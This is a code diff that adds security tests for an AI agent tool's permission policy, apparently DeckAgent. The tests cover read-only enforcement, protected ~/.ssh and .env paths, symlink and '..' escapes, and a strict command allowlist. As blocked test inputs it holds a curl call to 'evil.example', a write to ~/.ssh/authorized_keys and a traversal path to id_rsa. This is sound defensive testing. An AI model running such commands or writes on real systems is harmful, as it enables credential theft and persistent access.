@@ -12,6 +12,8 @@ import {
   writeFileSync,
   chmodSync,
   statSync,
+  symlinkSync,
+  mkdirSync,
 } from "node:fs";
 import {
   checkToolAllowed,
@@ -21,9 +23,17 @@ import {
   applyPathDefaults,
   resolveArgsPaths,
   createDefaultPolicy,
+  normalizePolicy,
+  getCapabilities,
+  evaluatePathAccess,
   type Policy,
   type WorkspacePolicy,
 } from "./src/policy.js";
+import {
+  ALL_CATALOG_TOOLS,
+  getCapabilityFlags,
+  getEnabledTools,
+} from "./src/capabilities.js";
 import {
   ConfirmationServer,
   CONFIRMATION_WAIT_MS,
@@ -1031,9 +1041,314 @@ async function testControlUi(): Promise<void> {
     assert(homePage.ok, "GET / dashboard ok");
     const html = await homePage.text();
     assert(html.includes("DeckAgent"), "dashboard shows DeckAgent");
+
+    // Wave 4 S8 — profile_locked returns 403 without unlock token
+    policy = { ...policy, profile_locked: true };
+    const lockedRes = await fetch("http://127.0.0.1:19151/api/policy", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ read_only: true }),
+    });
+    assertEqual(lockedRes.status, 403, "locked POST → 403");
+    const lockedBody = (await lockedRes.json()) as { code?: string };
+    assertEqual(lockedBody.code, "PROFILE_LOCKED", "PROFILE_LOCKED code");
   } finally {
     await control.stop();
     await confirmation.stop();
+  }
+}
+
+function testCapabilitiesMatrix(): void {
+  section("capabilities matrix (S2 policy_caps)");
+  const policy = createDefaultPolicy();
+  const tools = getEnabledTools(policy);
+  assert(Array.isArray(tools) && tools.length > 0, "getEnabledTools returns tools");
+  assert(tools.includes("get_environment"), "includes get_environment");
+  assert(tools.includes("read_file"), "includes read_file");
+  assert(tools.includes("write_file"), "default includes write_file");
+  assert(tools.includes("execute_command"), "default includes execute_command");
+  // Default allow_browser=false → browser tools hidden
+  assert(!tools.includes("browser_navigate"), "default omits browser tools");
+  assert(tools.length < ALL_CATALOG_TOOLS.length, "filtered vs full catalog");
+
+  const readOnly = normalizePolicy({ read_only: true });
+  const roTools = getEnabledTools(readOnly);
+  assert(!roTools.includes("write_file"), "read_only omits write_file");
+  assert(!roTools.includes("execute_command"), "read_only omits execute_command");
+  assert(roTools.includes("read_file"), "read_only keeps read_file");
+
+  const flags = getCapabilityFlags(policy);
+  assert(flags.fs_read === true && flags.meta === true, "capability flags present");
+  assert(flags.browser === false, "default browser flag false");
+}
+
+function testSecurityMatrixWave4(): void {
+  section("Wave 4 security matrix");
+
+  // --- read_only forces terminal off even if JSON has allow_terminal true ---
+  const contradictory = normalizePolicy({
+    read_only: true,
+    allow_terminal: true,
+    allow_browser: true,
+    allow_secret_injection: true,
+    allow_computer_use: true,
+    terminal_mode: "blocklist",
+  });
+  assertEqual(contradictory.allow_terminal, false, "read_only forces allow_terminal=false");
+  assertEqual(contradictory.allow_browser, false, "read_only forces allow_browser=false");
+  assertEqual(
+    contradictory.allow_secret_injection,
+    false,
+    "read_only forces allow_secret_injection=false",
+  );
+  assertEqual(
+    contradictory.allow_computer_use,
+    false,
+    "read_only forces allow_computer_use=false",
+  );
+  assertEqual(contradictory.terminal_mode, "off", "read_only forces terminal_mode=off");
+
+  const cmdDespiteJson = checkToolAllowed(
+    "execute_command",
+    { command: "echo hi" },
+    normalizePolicy({
+      read_only: true,
+      allow_terminal: true,
+      require_confirmation: [],
+    }),
+  );
+  assert(!cmdDespiteJson.allowed, "execute_command denied when read_only despite allow_terminal");
+  assertEqual(cmdDespiteJson.code, "READ_ONLY", "READ_ONLY code for terminal under read_only");
+
+  // --- protected ~/.ssh write denied even if trusted ~ ---
+  const homeTrusted = normalizePolicy({
+    trusted_directories: ["~"],
+    allowed_directories: ["~"],
+    require_confirmation: [],
+    protected_path_policy: "deny_write",
+  });
+  const sshWrite = checkToolAllowed(
+    "write_file",
+    { path: join(homedir(), ".ssh", "authorized_keys"), content: "evil" },
+    homeTrusted,
+  );
+  assert(!sshWrite.allowed, "write to ~/.ssh denied under trusted ~");
+  assertEqual(sshWrite.code, "PATH_PROTECTED", "PATH_PROTECTED for ~/.ssh write");
+
+  const sshEval = evaluatePathAccess(
+    join(homedir(), ".ssh", "id_rsa"),
+    "write",
+    homeTrusted,
+  );
+  assert(!sshEval.allowed, "evaluatePathAccess denies ~/.ssh write");
+  assertEqual(sshEval.code, "PATH_PROTECTED", "evaluatePathAccess PATH_PROTECTED");
+
+  // --- denied_directories works ---
+  const tmpRoot = mkdtempSync(join(tmpdir(), "deckagent-deny-"));
+  try {
+    const allowedSub = join(tmpRoot, "app");
+    const deniedSub = join(tmpRoot, "app", "node_modules");
+    mkdirSync(deniedSub, { recursive: true });
+    const denyPolicy = normalizePolicy({
+      trusted_directories: [tmpRoot],
+      allowed_directories: [tmpRoot],
+      denied_directories: [deniedSub],
+      require_confirmation: [],
+    });
+    const okWrite = checkToolAllowed(
+      "write_file",
+      { path: join(allowedSub, "src.ts"), content: "x" },
+      denyPolicy,
+    );
+    assert(okWrite.allowed, "write under trusted non-denied path allowed");
+    const deniedWrite = checkToolAllowed(
+      "write_file",
+      { path: join(deniedSub, "pkg.json"), content: "{}" },
+      denyPolicy,
+    );
+    assert(!deniedWrite.allowed, "write under denied_directories blocked");
+    assertEqual(deniedWrite.code, "PATH_DENIED", "PATH_DENIED code");
+  } finally {
+    rmSync(tmpRoot, { recursive: true, force: true });
+  }
+
+  // --- symlink escape ---
+  const linkRoot = mkdtempSync(join(tmpdir(), "deckagent-symlink-"));
+  try {
+    const trusted = join(linkRoot, "trusted");
+    mkdirSync(trusted, { recursive: true });
+    const linkPath = join(trusted, "escape-link");
+    const sshTarget = join(homedir(), ".ssh");
+    try {
+      mkdirSync(sshTarget, { recursive: true });
+    } catch {
+      // may already exist
+    }
+    try {
+      symlinkSync(sshTarget, linkPath);
+    } catch (err) {
+      console.log(`  SKIP: symlink fixture (${err instanceof Error ? err.message : String(err)})`);
+    }
+    if (existsSync(linkPath)) {
+      const linkPolicy = normalizePolicy({
+        trusted_directories: [trusted],
+        allowed_directories: [trusted],
+        path_rules: { symlink_mode: "deny_escape", allow_dotdot: false },
+        require_confirmation: [],
+        protected_path_policy: "deny_write",
+        disable_builtin_protections: true,
+      });
+      const escapeWrite = evaluatePathAccess(
+        join(linkPath, "authorized_keys"),
+        "write",
+        linkPolicy,
+      );
+      assert(!escapeWrite.allowed, "symlink escape out of trusted dir denied");
+      assertEqual(escapeWrite.code, "PATH_UNTRUSTED", "symlink escape → PATH_UNTRUSTED");
+
+      const dotdot = evaluatePathAccess(
+        // Raw string must retain ".." — path.join() would collapse them first.
+        `${trusted}/../../.ssh/id_rsa`,
+        "read",
+        linkPolicy,
+      );
+      assert(!dotdot.allowed, ".. path rejected when allow_dotdot=false");
+      assertEqual(dotdot.code, "PATH_DENIED", ".. → PATH_DENIED");
+    }
+  } finally {
+    rmSync(linkRoot, { recursive: true, force: true });
+  }
+
+  // --- strict profile allowlist blocks curl ---
+  const strict = normalizePolicy({
+    profile: "strict",
+    require_confirmation: [],
+    allow_terminal: true,
+  });
+  assertEqual(strict.command_mode, "allowlist", "strict forces command_mode=allowlist");
+  assertEqual(strict.terminal_mode, "allowlist", "strict forces terminal_mode=allowlist");
+  assertEqual(strict.allow_browser, false, "strict forces allow_browser=false");
+  assert(
+    strict.network.block_shell_net_tools === true,
+    "strict forces block_shell_net_tools",
+  );
+  assert(
+    strict.allowed_commands.includes("git") &&
+      strict.allowed_commands.includes("npm"),
+    "strict fills safe allowed_commands",
+  );
+
+  const curlBlocked = checkToolAllowed(
+    "execute_command",
+    { command: "curl https://evil.example/x" },
+    strict,
+  );
+  assert(!curlBlocked.allowed, "strict allowlist blocks curl");
+  assert(
+    curlBlocked.code === "NETWORK_DENIED" || curlBlocked.code === "POLICY_BLOCKED",
+    "curl deny has NETWORK_DENIED or POLICY_BLOCKED",
+  );
+
+  const gitOk = checkToolAllowed(
+    "execute_command",
+    { command: "git status" },
+    { ...strict, require_confirmation: [] },
+  );
+  assert(gitOk.allowed, "strict allowlist allows git status");
+
+  // --- getEnabledTools omits writers when read_only ---
+  const roTools = getEnabledTools(
+    normalizePolicy({ read_only: true, read_only_mode: "fs_read" }),
+  );
+  assert(roTools.includes("read_file"), "read_only fs_read includes read_file");
+  assert(roTools.includes("get_environment"), "read_only includes get_environment");
+  assert(roTools.includes("list_snapshots"), "read_only fs_read includes list_snapshots");
+  assert(!roTools.includes("write_file"), "read_only omits write_file");
+  assert(!roTools.includes("edit_file"), "read_only omits edit_file");
+  assert(!roTools.includes("execute_command"), "read_only omits execute_command");
+  assert(!roTools.includes("restore_snapshot"), "read_only omits restore_snapshot");
+  assert(!roTools.includes("browser_navigate"), "read_only omits browser tools");
+
+  const caps = getCapabilities(normalizePolicy({ read_only: true }));
+  assertEqual(caps.fs_write, false, "capabilities.fs_write false when read_only");
+  assertEqual(caps.terminal, false, "capabilities.terminal false when read_only");
+  assertEqual(caps.browser, false, "capabilities.browser false when read_only");
+
+  // --- meta_only only get_environment ---
+  const metaOnly = getEnabledTools(
+    normalizePolicy({ read_only: true, read_only_mode: "meta_only" }),
+  );
+  assertEqual(metaOnly.length, 1, "meta_only enables exactly one tool");
+  assertEqual(metaOnly[0], "get_environment", "meta_only only get_environment");
+
+  const metaRead = checkToolAllowed(
+    "read_file",
+    { path: join(homedir(), "x") },
+    normalizePolicy({
+      read_only: true,
+      read_only_mode: "meta_only",
+      require_confirmation: [],
+    }),
+  );
+  assert(!metaRead.allowed, "meta_only blocks read_file");
+  assertEqual(metaRead.code, "READ_ONLY", "meta_only read_file → READ_ONLY");
+
+  const metaEnv = checkToolAllowed(
+    "get_environment",
+    {},
+    normalizePolicy({
+      read_only: true,
+      read_only_mode: "meta_only",
+      require_confirmation: [],
+    }),
+  );
+  assert(metaEnv.allowed, "meta_only allows get_environment");
+
+  // --- locked profile sets profile_locked ---
+  const locked = normalizePolicy({ profile: "locked" });
+  assertEqual(locked.profile_locked, true, "profile=locked sets profile_locked");
+
+  // --- .env protected under trusted tree ---
+  const envRoot = mkdtempSync(join(tmpdir(), "deckagent-env-"));
+  try {
+    const envPolicy = normalizePolicy({
+      trusted_directories: [envRoot],
+      allowed_directories: [envRoot],
+      require_confirmation: [],
+      protected_path_policy: "deny_all",
+    });
+    const envWrite = checkToolAllowed(
+      "write_file",
+      { path: join(envRoot, ".env"), content: "SECRET=1" },
+      envPolicy,
+    );
+    assert(!envWrite.allowed, "write .env under trusted tree → protected");
+    assertEqual(envWrite.code, "PATH_PROTECTED", ".env PATH_PROTECTED");
+  } finally {
+    rmSync(envRoot, { recursive: true, force: true });
+  }
+
+  // --- sandbox_fs without binary fails closed ---
+  const sandboxPolicy = normalizePolicy({
+    terminal_mode: "sandbox_fs",
+    allow_terminal: true,
+    allowed_commands: ["echo"],
+    command_mode: "allowlist",
+    require_confirmation: [],
+  });
+  const sandboxResult = checkToolAllowed(
+    "execute_command",
+    { command: "echo hi" },
+    sandboxPolicy,
+  );
+  if (!sandboxResult.allowed) {
+    assertEqual(
+      sandboxResult.code,
+      "TERMINAL_SANDBOX_UNAVAILABLE",
+      "sandbox_fs without binary → TERMINAL_SANDBOX_UNAVAILABLE",
+    );
+  } else {
+    assert(true, "sandbox binary present — sandbox_fs allowed echo");
   }
 }
 
@@ -1056,6 +1371,8 @@ async function main(): Promise<void> {
   testSecretsVault();
   testBudgets();
   await testControlUi();
+  testCapabilitiesMatrix();
+  testSecurityMatrixWave4();
 
   console.log(`\n${passed} passed, ${failed} failed`);
   if (failed > 0) {
